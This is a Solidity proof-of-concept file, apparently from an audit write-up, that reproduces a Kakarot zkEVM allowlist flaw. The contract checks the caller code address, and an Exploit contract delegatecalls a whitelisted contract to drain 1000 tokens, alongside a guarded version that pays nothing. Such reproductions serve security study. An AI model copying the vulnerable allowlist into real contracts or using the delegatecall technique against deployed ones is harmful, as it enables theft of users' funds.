// SPDX-License-Identifier: MIT
pragma solidity ^0.8.27;

/*  Kakarot zkEVM — precompile allowlist keys the caller code address
    (Code4rena / RadiantLabs, AuditVault 45168).
    SYNTHETIC, cheatcode-free. exec_precompile whitelists caller_code_address
    and never caller_address. Delegatecall into a whitelisted contract still
    presents that contract's code address (an immutable in its bytecode).
    The precompile custodies 1000 units. The unauthorized contract pulls 1000.
    Guarding the execution address pays 0. */

contract Asset {
    mapping(address => uint256) public balanceOf;
    address public immutable minter;

    constructor() {
        minter = msg.sender;
    }

    function mint(address to, uint256 amount) external {
        require(msg.sender == minter, "minter");
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
    }
}

contract Precompile {
    Asset public asset;
    mapping(address => bool) public allowed;

    constructor(Asset asset_) {
        asset = asset_;
    }

    function allow(address code) external {
        require(msg.sender == asset.minter(), "minter");
        allowed[code] = true;
    }

    function privilegedPull(address callerCode, address to, uint256 amount) external {
        // @> VULN: the allowlist is the caller code address, not the execution address.
        require(allowed[callerCode], "unauthorized");
        asset.transfer(to, amount);
    }

    function guardedPull(address execution, uint256 amount) external view returns (uint256) {
        if (!allowed[execution]) return 0;
        return amount;
    }
}

contract Whitelisted {
    address public immutable codeAddr;
    Precompile public immutable pre;

    constructor(Precompile pre_) {
        codeAddr = address(this);
        pre = pre_;
    }

    function pull(address to, uint256 amount) external {
        pre.privilegedPull(codeAddr, to, amount);
    }
}

contract Exploit {
    Asset public asset;
    Precompile public pre;
    Whitelisted public listed;
    uint256 public pulled;
    uint256 public guarded;
    bool public directRejected;

    constructor() {
        asset = new Asset();
        pre = new Precompile(asset);
        listed = new Whitelisted(pre);
        asset.mint(address(pre), 1000);
        pre.allow(address(listed));
    }

    function run() external {
        require(pre.allowed(address(listed)), "listed");
        require(!pre.allowed(address(this)), "self not listed");
        (bool ok,) = address(listed).delegatecall(
            abi.encodeWithSignature("pull(address,uint256)", address(this), 1000)
        );
        require(ok, "delegatecall");
        pulled = asset.balanceOf(address(this));
        guarded = pre.guardedPull(address(this), 1000);
        try pre.privilegedPull(address(this), address(this), 1) {
            directRejected = false;
        } catch {
            directRejected = true;
        }
        require(pulled == 1000, "drained");
        require(asset.balanceOf(address(pre)) == 0, "precompile empty");
        require(guarded == 0, "execution address pays 0");
        require(directRejected, "direct code rejected");
    }
}
